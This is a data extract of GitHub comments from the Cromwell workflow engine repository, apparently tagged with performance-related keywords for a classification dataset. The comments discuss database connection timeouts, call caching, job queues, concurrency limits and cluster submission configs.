Performance,Stacktrace:. ```; java.sql.SQLTimeoutException: Timeout after 5059ms of waiting for a connection.; at com.zaxxer.hikari.pool.BaseHikariPool.getConnection(BaseHikariPool.java:227) ~[cromwell.jar:0.19]; at com.zaxxer.hikari.pool.BaseHikariPool.getConnection(BaseHikariPool.java:182) ~[cromwell.jar:0.19]; at com.zaxxer.hikari.HikariDataSource.getConnection(HikariDataSource.java:93) ~[cromwell.jar:0.19]; at slick.jdbc.hikaricp.HikariCPJdbcDataSource.createConnection(HikariCPJdbcDataSource.scala:12) ~[cromwell.jar:0.19]; at slick.jdbc.JdbcBackend$BaseSession.conn$lzycompute(JdbcBackend.scala:415) ~[cromwell.jar:0.19]; at slick.jdbc.JdbcBackend$BaseSession.conn(JdbcBackend.scala:414) ~[cromwell.jar:0.19]; at slick.jdbc.JdbcBackend$BaseSession.startInTransaction(JdbcBackend.scala:437) ~[cromwell.jar:0.19]; at slick.driver.JdbcActionComponent$StartTransaction$.run(JdbcActionComponent.scala:41) ~[cromwell.jar:0.19]; at slick.driver.JdbcActionComponent$StartTransaction$.run(JdbcActionComponent.scala:38) ~[cromwell.jar:0.19]; at slick.backend.DatabaseComponent$DatabaseDef$$anon$2.liftedTree1$1(DatabaseComponent.scala:237) ~[cromwell.jar:0.19]; at slick.backend.DatabaseComponent$DatabaseDef$$anon$2.run(DatabaseComponent.scala:237) ~[cromwell.jar:0.19]; at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142) ~[na:1.8.0_72]; at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617) ~[na:1.8.0_72]; at java.lang.Thread.run(Thread.java:745) ~[na:1.8.0_72]; ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/737#issuecomment-214518906:1273,concurren,concurrent,1273,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/737#issuecomment-214518906,2,['concurren'],['concurrent']
Performance,Still queued internally.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6151#issuecomment-825196034:6,queue,queued,6,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6151#issuecomment-825196034,1,['queue'],['queued']
Performance,"Submitting for discussion. This change should fix some of the errors of this type we're seeing by clearing cache for both relevant workflows instead of just one. However, it will only do so in the specific case where the initial test failure happens when checking cache behavior, because that's the only time we have easy access to the id of the associated workflow. My assumption is that this will reduce the likelihood of this error but not eliminate it. . Before going back and making a larger change to pass an object containing all relevant workflow ids through a bunch of different test code, to ensure it can always be part of `CentaurTestException`, I wanted to get some initial feedback. Is this (adding additional workflow id(s) to `CentaurTestException` so that we can easily clear their cache hits from the database in `tryTryAgain`) the right direction to fix this problem? It feels wrong to update the signatures of all these unrelated methods just to populate the exception. I also thought about trying to update `TestFormulas.runWorkflowTwiceExpectingCaching` and other similar methods to capture the raised `CentaurTestException`, add the additional workflow id(s), and rethrow, but didn't want to mess with the location the error is thrown from.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6654#issuecomment-1016819134:107,cache,cache,107,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6654#issuecomment-1016819134,3,['cache'],['cache']
Performance,"Suggestion: Use GATK Queue as a guideline. Those messages were reasonable. On Wed, Feb 22, 2017 at 2:17 PM, Jeff Gentry <notifications@github.com>; wrote:. > this has come up a few times in a few different issues and that multitude; > actually makes the larger point here. Internally we've been discussing how; > to handle this as an upcoming project. In particular the problem is that we; > have too many different user personas and trying to have a single form of; > log meet all of their needs is going to be useless. Log levels doesn't; > quite capture all of the variables that might be in play here as often what; > happens is that someone 99% of the time only wants to see form X but once; > in a while *really* needs to see form Y and it's useless if Y wasn't; > captured at all.; >; > We're going to be moving towards some sort of system where there are; > different sorts of logs and then everyone can be happy, or at least; > happier. That's probably at least a ""next quarter"" level of project,; > however.; >; > —; > You are receiving this because you authored the thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/1883#issuecomment-281771971>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/ACDXk_a13fmpLUm3gESPL3BzZfNNvuzIks5rfInSgaJpZM4LpV_C>; > .; >. -- ; Lee Lichtenstein; Broad Institute; 75 Ames Street, Room 7003EB; Cambridge, MA 02142; 617 714 8632",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1883#issuecomment-281774983:21,Queue,Queue,21,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1883#issuecomment-281774983,1,['Queue'],['Queue']
Performance,"Synchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-18"" #93 prio=5 os_prio=0 tid=0x00007fdaa80bc800 nid=0xa54 waiting on condition [0x00007fda90777000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745); ....snip.... ""ForkJoinPool-2-worker-29"" #38 daemon prio=5 os_prio=0 tid=0x00007fdaf4001000 nid=0xa0e waiting on condition [0x00007fdb8073c000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b540500> (a scala.concurrent.forkjoin.ForkJoinPool); at scala.concurrent.forkjoin.ForkJoinPool.scan(ForkJoinPool.java:2075); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). ""db-1"" #37 daemon prio=5 os_prio=0 tid=0x00007fdaf833e800 nid=0xa0d waiting on condition [0x00007fdb80ad0000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914:2819,concurren,concurrent,2819,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914,1,['concurren'],['concurrent']
Performance,"Synchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-19"" #94 prio=5 os_prio=0 tid=0x00007fdaa80be800 nid=0xa55 waiting on condition [0x00007fda90676000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-18"" #93 prio=5 os_prio=0 tid=0x00007fdaa80bc800 nid=0xa54 waiting on condition [0x00007fda90777000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadP",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914:1942,concurren,concurrent,1942,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914,1,['concurren'],['concurrent']
Performance,"TB in testing so I don’t know if size is the problem. Does the issue persist after restarting the server? I committed a change to the develop branch a few weeks ago that does a better job of cleaning up the copying resources. If the restart solves the problem then you may want to build from the develop branch until the next release is sent out. Also, is the bucket containing the source file the same bucket as the workflow bucket? If not, are they in the same region?; > […](#); > On Wed, Nov 11, 2020 at 4:28 AM Luyu ***@***.***> wrote: Hi, The improved multipart copying (api: CreateMultipartUpload) doesn't work for me. The cromwell server always checks the existence of the cached file before the copying finishes. In Cromwell v51 and before, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf … <#m_3227077625045957240_> On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out wai",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046:1068,perform,perform,1068,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046,2,"['cache', 'perform']","['cached', 'perform']"
Performance,TOL2: Do we want to have an concurrency protection on this action (eg to run at most 1 docker build at a time?) to avoid awkward race conditions (or merge conflicts) in cromwhelm if two actions are competing to update the helm chart at the same time?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6739#issuecomment-1105146934:28,concurren,concurrency,28,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6739#issuecomment-1105146934,2,"['concurren', 'race condition']","['concurrency', 'race conditions']"
Performance,"TOL:; * Is it worth having separate queues for summarizable vs non-summarizable metadata, and separate writers drawing from those two separate queues at separate rates?; * Is it worth assigning ""summarizable"" vs ""non-summarizable"" at metadata generation time rather than working it out again just before writing based on string matching (eg `SummarizableMetadataEvent` and `NonSummarizableMetadataEvent` subtypes of a `MetadataEvent` trait)?; * It'd be nice to be able to separate metadata write metrics between summarizable and non-summarizable metadata processing",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5509#issuecomment-624744933:36,queue,queues,36,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5509#issuecomment-624744933,2,['queue'],['queues']
Performance,Tested the newer fingerprint hashing strategy (using a hash of equal size). Happy to report about 1000 cache hits (100%) correctly on our cluster when I needed to restart a workflow.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5450#issuecomment-610339380:103,cache,cache,103,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5450#issuecomment-610339380,1,['cache'],['cache']
Performance,"Thanks @illusional, I've come to a very similar configuration, albeit for singularity 3.X. I ended up settling on this:. ```; submit-docker = """"""; export SINGULARITY_CACHEDIR=/data/cephfs/punim0751/singularity_cache; module load Singularity/3.0.3-spartan_gcc-6.2.0; IMAGE=/data/cephfs/punim0751/${docker}; singularity build --sandbox $IMAGE docker://${docker} > /dev/null; sbatch -J ${job_name} -D ${cwd} -o ${cwd}/execution/stdout -e ${cwd}/execution/stderr -t ${runtime_minutes} \; ${""-c "" + cpus} \; --mem-per-cpu=${requested_memory_mb_per_core} \; --wrap ""singularity exec --userns -B ${cwd}:${docker_cwd} $IMAGE ${job_shell} ${script}""; """"""; ```. Just two things I'd like to discuss. Firstly, because you are pulling the docker image inside the sbatch script, this depends on the cluster you're working on allowing network access for the workers. While that is possible on our local cluster, my discussion with some sysadmins made me realise that this wasn't necessarily commonplace, and even on our cluster they strongly discouraged me from relying too heavily on it. This made me look for a solution that was even more generalizable. This is why I `singularity build` the image before I submit it, using the head node. This ensures that all network-requiring work is done on the head node, where network access is guaranteed. I also make sure to set a cache directory, so we don't download the same docker image multiple times in the case of a scatter job etc. Of course, if you do have network access for your workers and the admins have no issue with you using it, pulling the image from the worker is probably a better option to avoid hogging the head node. The second main difference in my config is that the singularity binary I was using did not have `setuid` permissions, meaning that I had to use the sandbox format, and run the image using `--userns`. This is obviously only required if your sysadmins don't trust `singularity`, but I think it's important to demonstrate a way of runni",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461281475:224,load,load,224,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461281475,1,['load'],['load']
Performance,"Thanks @rhpvorderman for the suggestions. . We are running wdl pipelines for single cell workloads that have thousands of concurrent tasks working on a dozen files each. Just the filesystem metadata operations alone are an issue for the filesystem, let alone whether the amount of data fetched is small. We were already hitting a wall in job submission speed due to this issue, we've been running cromwell with these changes in production now without issues. Reducing the number of threads would also reduce the task throughput and limit performance. #4900 is not what we need because we dont want to waste time copying when we can just soft-link. I have little doubt this solution is the most optimal for our team. However, I understand your concerns about docker. We are happy to do a little extra work to make this PR palatable to your team, perhaps by adding warnings in the appropriate places?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6676#issuecomment-1045223132:122,concurren,concurrent,122,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6676#issuecomment-1045223132,3,"['concurren', 'perform', 'throughput']","['concurrent', 'performance', 'throughput']"
Performance,"Thanks for pointing out the Cromwell/PAPI v2 beta support for docker image caches, I wasn't aware of this feature. . After reading the documentation at https://cromwell.readthedocs.io/en/develop/backends/Google/#docker-image-cache-support, I have a few additional questions about how this could help with the problem described in this issue. . It looks like docker image caching needs to be configured at the Cromwell server level with a manifest file indicating the location of images. Are the images listed in the manifest truly global (as indicated in their paths, ie `projects/broad-dsde-cromwell-dev/global/images/..`), so they won't incur egress to use them to create VMs in different regions? Can they be made public for use by users in other projects?. For an external user already running their own cromwell instance in a different region who wants to run our pipeline, we'd need to publish an image caching configuration stanza and manifest file along with our workflow, and the administrator of the cromwell server would need to modify their server configuration to point to our manifest file and restart the server -- is that correct? If their cromwell server was already configured with a different image cache manifest, is there a way to add a second manifest, or would they have to edit their own cache manifest to include the entries in ours?. If I'm right in my understanding (please correct me if I'm not) it seems like this solution could help, but is quite cumbersome and requires very savvy external users who are willing to take extra steps to help prevent saddling us with egress charges. It would be great if a cache manifest could be configured at the workflow level -- perhaps in the wdl or the workflow options.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-887774738:75,cache,caches,75,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-887774738,5,['cache'],"['cache', 'cache-support', 'caches']"
Performance,"Thanks for reporting, Cromwell definitely shouldn't write something to cache that it cannot read back! . If you can bear it, a workaround would be to run without call-caching. ---. It looks like we're (at least) missing a; ```; case ""Long"" => WomLongType.coerceRawValue; ```; in https://github.com/broadinstitute/cromwell/blob/develop/engine/src/main/scala/cromwell/Simpletons.scala#L25",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4023#issuecomment-414715591:71,cache,cache,71,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4023#issuecomment-414715591,1,['cache'],['cache']
Performance,"Thanks so much, unfortunately there aren't any other errors. The runner kicks off 3 more jobs (for 3 variant callers on run on this failed cache input). Those all complete and then the main process just stops. There are no more submissions to the cluster or anything beyond the main job waiting. Here is the remainder of the log if it's helpful:; ```; [2018-05-02 15:22:58,85] [info] 9fa3ab92-97fd-4bed-a636-6eaf38941141-SubWorkflowActor-SubWorkflow-variantcall:1:1 [[38;5;2m9fa3ab92[0m]: Starting get_parallel_regions; [2018-05-02 15:22:58,85] [info] b0777d55-4f75-47aa-9655-3119936b10a5-SubWorkflowActor-SubWorkflow-variantcall:2:1 [[38;5;2mb0777d55[0m]: Starting get_parallel_regions; [2018-05-02 15:22:58,85] [info] b4328660-38fb-4bd7-8220-cd2f47bb26b2-SubWorkflowActor-SubWorkflow-variantcall:0:1 [[38;5;2mb4328660[0m]: Starting get_parallel_regions; [2018-05-02 15:22:59,95] [[38;5;220mwarn[0m] DispatchedConfigAsyncJobExecutionActor [[38;5;2mb4328660[0mget_parallel_regions:NA:1]: Unrecognized runtime attribute keys: memoryMax, tmpDirMin, cpuMax, cpuMin, tmpDirMax, outDirMin, memoryMin, outDirMax; [2018-05-02 15:22:59,95] [[38;5;220mwarn[0m] DispatchedConfigAsyncJobExecutionActor [[38;5;2m9fa3ab92[0mget_parallel_regions:NA:1]: Unrecognized runtime attribute keys: memoryMax, tmpDirMin, cpuMax, cpuMin, tmpDirMax, outDirMin, memoryMin, outDirMax; [2018-05-02 15:22:59,98] [[38;5;220mwarn[0m] DispatchedConfigAsyncJobExecutionActor [[38;5;2mb0777d55[0mget_parallel_regions:NA:1]: Unrecognized runtime attribute keys: memoryMax, tmpDirMin, cpuMax, cpuMin, tmpDirMax, outDirMin, memoryMin, outDirMax; [2018-05-02 15:23:00,78] [info] DispatchedConfigAsyncJobExecutionActor [[38;5;2m9fa3ab92[0mget_parallel_regions:NA:1]: [38;5;5m'bcbio_nextgen.py' 'runfn' 'get_parallel_regions' 'cwl' 'sentinel_runtime=cores,1,ram,3839.9999999999995' 'sentinel_parallel=batch-split' 'sentinel_outputs=region_block' 'sentinel_inputs=batch_rec:record'[0m; [2018-05-02 15:23:00,79] [info] Di",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3584#issuecomment-386387039:139,cache,cache,139,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3584#issuecomment-386387039,1,['cache'],['cache']
Performance,Thanks to @ruchim both Green (single sample / arrays) workflows are integrated into the Jenkins [tyburn-cromwell-test](https://gotc-jenkins.dsp-techops.broadinstitute.org/job/tyburn-cromwell-test/) job. This job runs daily at 8 am M-F currently and is governed by the Jenkins [tyburn-master-job](https://gotc-jenkins.dsp-techops.broadinstitute.org/job/tyburn-master-test/) The code is not checked into develop because of Tyburn history 😡 so all the integrated test code is located on the rm_startingPoint [branch](https://github.com/broadinstitute/tyburn/tree/rm_startingPoint). Hopefully it will be back in develop soon but it probably wont be before my sabbatical is over so this is the current state of things. In the [configure](https://gotc-jenkins.dsp-techops.broadinstitute.org/job/tyburn-cromwell-test/configure) of the jenkins tyburn-cromwell-test job there is a script section where we invoke the tyburn command we use to run the test. Here you can config values that change shape the test. ```; -Dexecutioners.workflowToInstance.singlesample=1 \; -Dexecutioners.workflowToInstance.arrays=1 \; -Dexecutioners.workflowToInstance.lots_of_inputs=1 \; ```. Each value tells Tyburn how many instances of each test to run. Currently it is set to 1 because we weren't sure what kind of load we were going for and how often the test will run.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2337#issuecomment-311365377:1289,load,load,1289,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2337#issuecomment-311365377,1,['load'],['load']
Performance,Thanks. Setting `cpuPlatform` in the runtime attributes is the only way to avoid scheduling to an e series machines through Cromwell. GCP Batch is limited to setting cpuPlatform or instance type. There is no preferred machine family type setting in GCP Batch. With that said the e series machine should not be that slow. Performance is supposed to be comparable to N1. If it repeatable open a support case with GCP.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7474#issuecomment-2256082242:321,Perform,Performance,321,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7474#issuecomment-2256082242,1,['Perform'],['Performance']
Performance,"That plot is the load on the Cromwell server itself? . From what's you've said, and the top output, it looks like your tasks are exeucting on that server as well. You mentioned that you're running SFS, can you tell us more about your configuration? Are you dispatching to PBS but the execution host is the cromwell server itself (where the sync commands are running)?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2057#issuecomment-284736542:17,load,load,17,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2057#issuecomment-284736542,1,['load'],['load']
Performance,"That will definitely allow for greater flexibility of distributed Cromwell architectures, making it possible to have interactive load-balancing and performing modifications on running workflows. Very cool indeed and looking forward with excited anticipation :) You guys are doing amazing work!. Many thanks,; ~p",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/397#issuecomment-177691924:129,load,load-balancing,129,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/397#issuecomment-177691924,2,"['load', 'perform']","['load-balancing', 'performing']"
Performance,"That's a cool use of this configuration to work around this issue !. I just want to give some context around it. This rate control was originally put in place to protect Cromwell against excessive load or a very large spike of jobs becoming runnable in a short period of time. Through this mechanism Cromwell can also stop starting new jobs altogether when under too heavy load.; While this achieve the desired effect of rate limiting how many submit requests are being sent to AWS batch in a period of time, I think a medium-term better fix is too implement something similar to the [PipelinesApiRequestManager](https://github.com/broadinstitute/cromwell/blob/develop/supportedBackends/google/pipelines/common/src/main/scala/cromwell/backend/google/pipelines/common/api/PipelinesApiRequestManager.scala) for the AWS backend.; The reason is that it acts as a coarse level of granularity which might have undesired side-effects:. 1) it is a system wide configuration, meaning in a multi backend Cromwell it might be too constraining for some backends and not enough for others; 2) It also rate limits starting jobs that might actually be call cached and incur 0 requests to AWS Batch, making it too conservative; 3) It only helps rate limiting the number of job creation requests to batch. Once a job is started, it issues status requests to monitor the job which aren't throttled. Not to say that this is a bad workaround, I think it's a *good* workaround, but still a workaround :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-444253181:197,load,load,197,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-444253181,4,"['cache', 'load', 'throttle']","['cached', 'load', 'throttled']"
Performance,"The Cromwell server is operating in a different region than the configured batch queue. Make sure that `region` is specified in the application conf file and matches that of the batch queue. For example, if your batch queue ARN is:. ```; queueArn = ""arn:aws:batch:us-west-2:<account number>:job-queue/GenomicsDefaultQueue-6938bfa7d75c42c""; ^^^^^^^^^; queue region; ```. the application conf file should specify:. ```; region = ""us-west-2""; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4334#issuecomment-434808638:81,queue,queue,81,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4334#issuecomment-434808638,6,['queue'],"['queue', 'queueArn']"
Performance,"The DNS name `batch.default.amazonaws.com` does not resolve - perhaps you need to change a value of `default` in the config to something else. For example, `batch.us-east-1.amazonaws.com` resolves fine (though predictably doesn't respond to ping, load a web page, etc.).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4334#issuecomment-434316568:247,load,load,247,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4334#issuecomment-434316568,1,['load'],['load']
Performance,"The `long_cmd` test is failing because the default MySQL packet size is too small for the gigantic metadata being generated, though I'm not sure if the problem is on the client or server or both. The capoeira tests complete successfully but get unexpected cache hits. I'm not sure why the CWL test is failing.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-471576407:256,cache,cache,256,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-471576407,1,['cache'],['cache']
Performance,"The `thread.sleep` command would need to be added to whichever actor(s) is actually submitting messages to the API. This doesn't strike me as too onerous for the developers, but you're right, it's definitely part of the scala and not the config files. Some minimal exception catching is also called for. Rather than throttling concurrent _jobs_ it probably makes more sense to limit the number and frequency of concurrent _workflow submissions_:; ```# Cromwell ""system"" settings; system {; ; # Cromwell will cap the number of running workflows at N; max-concurrent-workflows = 5000 # No practical limit on the number of total workflows. # Cromwell will launch up to N submitted workflows at a time, regardless of how many open workflow slots exist; max-workflow-launch-count = 4 # Too conservative?. # Number of seconds between workflow launches; new-workflow-poll-rate = 5 # Too conservative?; }; ```; This should stagger submissions without limiting the total amount of work being done. The number of threads available to the backend-dispatcher also appears to settable. You could create an artificial bottleneck there to protect AWS's API.`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-436674279:327,concurren,concurrent,327,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-436674279,4,"['bottleneck', 'concurren']","['bottleneck', 'concurrent', 'concurrent-workflows']"
Performance,"The cause and effect:. - An assumption in the token dispenser actor (that none of the internal queues were ever empty) turned out to not always be true; - As a result, not infrequently an attempted `dequeue` would cause the `JobExecutionTokenDispenserActor` to crash and be restarted - zeroing out all known token dispensations *and* all known actors waiting for tokens.; - The overall consequence of this was that jobs would submit their request for exeution tokens and be added to a queue. But that queue was lost when the `JobExecutionTokenDispenserActor` was restarted and therefore the jobs would sit forever waiting for a token which was never sent to them. The fix:; - First, add a sanity check before calling `dequeue`. If the queue is empty, don't do it. But hopefully will now be a redundant check thanks to:; - Second, one situation was identified which would lead to this state when token-requesting-actors were aborting before a token was dispensed. If that left the token queue for that hog group empty then the queue was not being correctly removed from the `JobExecutionTokenDispenserActor` - thus leaving an empty queue behind and triggering the ""dequeue on an empty queue"" bug.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4908#issuecomment-488345810:95,queue,queues,95,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4908#issuecomment-488345810,8,['queue'],"['queue', 'queues']"
Performance,"The centaur tests actually failed because `Futures timed out after 10000ms`. Since we're trying to check correctness rather than Local backend scalability performance here, can we run this using the script?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/987#issuecomment-225578420:143,scalab,scalability,143,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/987#issuecomment-225578420,2,"['perform', 'scalab']","['performance', 'scalability']"
Performance,"The cpu and memory usage points are not addressed by `concurrent-job-limit`, so I've labeled this for PO review.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2365#issuecomment-326080916:54,concurren,concurrent-job-limit,54,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2365#issuecomment-326080916,1,['concurren'],['concurrent-job-limit']
Performance,The endpoints which query the metadata table and would be affected by the removal of the mentioned indices are:; - metadata; - timing; - logs; - query. The performance of `/metadata` and `/timing` endpoints have been measured and put in the doc. The remaining 2 endpoints are not being called through FC and hence their performance doesn't need to be evaluated.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4733#issuecomment-475366909:156,perform,performance,156,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4733#issuecomment-475366909,2,['perform'],['performance']
